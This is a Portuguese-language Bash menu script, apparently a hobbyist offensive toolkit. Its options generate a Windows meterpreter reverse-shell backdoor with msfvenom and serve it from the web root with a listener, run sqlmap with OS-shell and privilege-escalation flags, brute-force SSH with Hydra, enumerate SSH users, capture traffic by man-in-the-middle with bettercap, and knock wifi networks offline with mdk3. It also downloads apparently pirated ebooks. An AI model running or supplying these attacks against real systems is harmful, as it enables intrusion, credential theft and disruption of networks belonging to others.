#!/bin/bash

#
#Que você não perca o charmoso costume de mandar á merda quem não te trata como você merece
#

#####################
		    #
	            #
		    #
#####################
#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"

echo
echo -e "$green ██████╗  ██████╗  ██████╗██╗  ██╗  "
echo -e "$greem ██╔══██╗██╔═══██╗██╔════╝██║ ██╔╝  "
echo -e "$green ██████╔╝██║   ██║██║     █████╔╝   " 
echo -e "$green ██╔══██╗██║   ██║██║     ██╔═██╗   " 
echo -e "$green ██║  ██║╚██████╔╝╚██████╗██║  ██╗  "
echo -e "$green ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝  "
echo                                 
                                 






while true
do
 echo     "#################################################"
 echo -e  "#             ROCK N ROOL                       #"
 echo     "#################################################"
 echo "# 1-BackDoor                     #"
 echo "# 2-Fotos                        #"
 echo "# 3-FootPrint                    #"
 echo "# 4-Livros                       #"
 echo "# 5-Aprender Shell Script        #"
 echo "# 6-Debian                       #"
 echo "# 7-Ubuntu                       #"
 echo "# 8-Arch Linux                   #"
 echo "# 9-Kali Linux                   #"
 echo "# 10-Rede Interna                #"
 echo "# 11-Integridade (Hash)          #"
 echo "# 12-Brut Force   SSH            #"
 echo "# 13-Rede Externa                #"
 echo "# 14-Análise hexadecimal         #"
 echo "# 15-Main The Middle             #"
 echo "# 16-Derrubar wifi               #"
 echo "# 17-Enumerar users SSH          #"
 echo "##################################"
 echo "#  R-Exite                       #"
 echo "##################################"
 echo -e "\n"
 echo -e "<ROCK> \c"
 read answer
 case "$answer" in
 1) read -p "Informe o nome da sua backdoor.exe: " nome
    read -p "Informe o seu IP interno: " ip
    read -p "Informe uma porta: " porta

    echo "Criando a backdoor....."
    echo "BackDoor Salva na /var/www/html"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$porta -f exe > /var/www/html/$nome
 
    msfconsole -x "use exploit/multi/handler; setg payload windows/meterpreter/reverse_tcp; setg lhost "$ip"; setg lport "$porta"; exploit" ;;

 2) git clone https://github.com/Leonardoimui/Pictures.git ;;

 3) read -p "Informe a url do seu ALVO: " url
    echo "Footprint...."
    ping -c3  $url
    whois $url
    whatweb -v $url
    echo "Vulnerabilidades....."
    nmap -sS -sC -sV $url
    nikto -h $url
    read -p "Quer realizar algum atack de sql injection ? Se quiser informe aqui a url da página vulnerável:  " sql
    echo "Atacando....."
    sqlmap --dbs --random-agent -o --threads=10 --level 4 --risk 3 --os-shell --os-bof --priv-esc --msf-path=/opt/metasploit --password --privileges --users --is-dba --privileges   --batch --beep  -a -b $sql ;;

 4) git clone https://github.com/Leonardoimui/Sniper.git ;;

 5) mkdir Bokshell
    cd Bokshell
    wget http://file.allitebooks.com/20161123/Wicked%20Cool%20Shell%20Scripts,%202nd%20Edition.pdf
    wget http://file.allitebooks.com/20160512/Learning%20Linux%20Shell%20Scripting.pdf
    wget http://file.allitebooks.com/20150519/Mastering%20Unix%20Shell%20Scripting,%202nd%20Edition.pdf
    wget http://file.allitebooks.com/20160309/Linux%20Command%20Line%20and%20Shell%20Scripting%20Bible,%203rd%20Edition.pdf
    wget http://file.allitebooks.com/20151106/Shell%20Scripting%20Recipes,%20Second%20Edition.pdf
    wget http://file.allitebooks.com/20150519/Learning%20Shell%20Scripting%20with%20Zsh.pdf
    wget http://file.allitebooks.com/20150519/Linux%20Shell%20Scripting%20Cookbook,%202nd%20Edition.pdf
    wget http://file.allitebooks.com/20150519/Linux%20Shell%20Scripting%20Cookbook,%202nd%20Edition.pdf
    wget http://file.allitebooks.com/20150519/Linux%20Command%20Line%20and%20Shell%20Scripting%20Bible,%202nd%20Edition.pdf
    wget http://file.allitebooks.com/20150519/Linux%20Shell%20Scripting%20Cookbook.pdf
    wget http://file.allitebooks.com/20150519/Shell%20Scripting.pdf
    wget http://file.allitebooks.com/20150519/Expert%20Shell%20Scripting.pdf
    wget http://file.allitebooks.com/20150519/Linux%20Command%20Line%20and%20Shell%20Scripting%20Bible.pdf
    wget http://file.allitebooks.com/20150519/Mastering%20Unix%20Shell%20Scripting,%202nd%20Edition.pdf
    wget http://file.allitebooks.com/20150519/Mastering%20Unix%20Shell%20Scripting.pdf ;;

 6) echo "Baixando alguns pacotes......"
    apt-get install virtualbox
    apt-get install postgresql
    apt-get install apache2
    apt-get install git
    apt-get install nmap
    apt-get install gedit
    apt-get install leafpad
    apt-get install kdenlive
    apt-get install figlet
    apt-get install conky
    apt-get install docky
    apt-get install evince
    apt-get install kazam
    apt-get install geany
    su
    su -c "echo 'deb http://ppa.launchpad.net/numix/ppa/ubuntu trusty main' > /etc/apt/sources.list.d/numix.list"
    su -c "echo 'deb-src http://ppa.launchpad.net/numix/ppa/ubuntu trusty main' >> /etc/apt/sources.list.d/numix.list"
    sudo apt-get update
    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 52B709720F164EEB
    sudo apt-get install numix-icon-theme-circle
    echo "Configurando Firewall...."
    iptables -F
    iptables -A INPUT -p tcp -m tcp --dport 80 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 8080 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 22 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 21 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 3306 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 5432 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 81 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 80 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 22 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 21 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 8080 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 23 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 5432 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 3306 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 631 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 443 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 4444 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 111 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 9050 -j DROP
    echo "Baixando Pacote do Iptables...."
    apt-get install iptables-persistent
    iptables-save
    echo "Parabńes Firewall configurado com Sucesso!" ;;

 7) echo "Baixando alguns pacotes...."
    apt-get install virtualbox
    apt-get install postgresql
    apt-get install apache2
    apt-get install git
    apt-get install nmap
    apt-get install gedit
    apt-get install leafpad
    apt-get install kdenlive
    apt-get install figlet
    apt-get install conky
    apt-get install docky
    apt-get install evince
    apt-get install kazam
    apt-get install geany
    sudo add-apt-repository ppa:numix/ppa
    sudo apt-get update
    sudo apt-get install numix-icon-theme-circle
    apt-get install software-center
    apt-get update
    echo "Configurando o Firewall..."
    iptables -F
    iptables -A INPUT -p tcp -m tcp --dport 80 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 8080 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 22 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 21 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 3306 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 5432 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p tcp -m tcp --dport 81 -m limit --limit 25/min --limit-burst 100 -j ACCEPT
    iptables -A INPUT -p icmp -m icmp --icmp-type 8 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 80 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 22 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 21 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 8080 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 23 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 5432 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 3306 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 631 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 443 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 4444 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 111 -j DROP
    iptables -A INPUT -p tcp -m tcp --dport 9050 -j DROP
    echo "Baixando Pacote do Iptables...."
    apt-get install iptables-persistent
    iptables-save
    echo "Parabńes Firewall configurado com Sucesso!" ;;

 8) echo "Instalando alguns pacotes......."
    pacman -S virtualbox
    pacman -S leafpad
    pacman -S gedit
    pacman -S geany
    curl -O https://blackarch.org/strap.sh
    sha1sum strap.sh
    chmod +x strap.sh
    sudo ./strap.sh
    sudo pacman -Sy postgresql pgadmin3
    su
    su - postgres
    initdb --locale $LANG -E UTF8 -D '/var/lib/postgres/data'
    sudo systemctl start postgresql.service
    sudo systemctl enable postgresql.service ;;

 9) sudo apt-get install xfce4-whiskermenu-plugin xfce4-cpufreq-plugin xfce4-battery-plugin xfce4-datetime-plugin xfce4-equake-plugin xfce4-fsguard-plugin xfce4-genmon-plugin xfce4-mailwatch-plugin xfce4-mount-plugin xfce4-smartbookmark-plugin xfce4-systemload-plugin xfce4-terminal xfce4-cpugraph-plugin xfce4-diskperf-plugin xfce4-netload-plugin xfce4-notifyd xfce4-sensors-plugin xfce4-verve-plugin
    systemctl --user enable pulseaudio && systemctl --user start pulseaudio
    su -c "echo 'deb http://ppa.launchpad.net/numix/ppa/ubuntu trusty main' > /etc/apt/sources.list.d/numix.list"
    su -c "echo 'deb-src http://ppa.launchpad.net/numix/ppa/ubuntu trusty main' >> /etc/apt/sources.list.d/numix.list"
    sudo apt-get update
    sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 52B709720F164EEB
    sudo apt-get install numix-icon-theme-circle ;;

 10) read -p "Informe seu endereço de IP interno: " inter
     nmap -v $inter/24
     route -n
     read -p "Deseja fazer scan em algum host especifico da rede ? " host
     nmap -sS -sC -v -sV $host ;;

 11) read -p "Informe o local do arquivo desejado para se obter a HASH: " ark
     cd $ark
     read -p "Informe o nome do arquivo: " hash
     echo "Obtendo resultados......"
     md5sum $hash
     sha256sum $hash ;;

 12) apt-get install hydra
     read -p "Informe o nome da Wordlist para quebrar senha: " lut
     read -p "Informe o IP do ALVO: " zorro
     read -p "Informe o usuário SSH: " mikey
     echo "Realizando o atack....."
     hydra -l $mikey -P $lut $zorro ssh -v -V ;;

 13) apt-get install nmap
     read -p "Informe o seu IP Externo: " zebra
     nmap -T4 -F -sV -sS -sC -O $zebra
     read -p "Deseja fazer um scan em algum host especifico ? " tyu
     nmap -sC -sS -sV -O $tyu ;;

 14) apt-get install hexedit
     read -p "Informe o local onde o arquivo está: " lour
     cd $lour
     read -p "Informe o nome do arquivo: " hex
     hexedit $hex ;;

 15) read -p "Informe o IP da máquina ALVO: " goku
     read -p "Digite o IP do seu roteador: " sask
     read -p "Nome do arquivo txt que vc quer savar a captura de dados: " name
     bettercap -X -T $goku --gateway $sask -O $name ;;

 16) iwconfig
     read -p "Qual é o nome da sua interface de rede ? " wlan
     airmon-ng start $wlan
     read -p "Qual é o nome da sua interface de rede atual ? " mk
     airodump-ng $mk
     read -p "Qual é o mac da rede ALVO ? " mac
     read -p "Qual é o numero do canal da rede alvo ? " ou
     iwconfig $mk channel $ou
     mdk3 $mk a -i $mac ;;

 17) service postgresql start
     read -p "Informe o IP do ALVO: " mesa
     read -p "Informe a userlist: " ario
     msfconsole -x "use auxiliary/scanner/ssh/ssh_enumusers; setg rhosts "$mesa"; setg threshold "11"; setg user_file "$ario"; exploit" ;;




 R|r) exit ;;
  esac
done
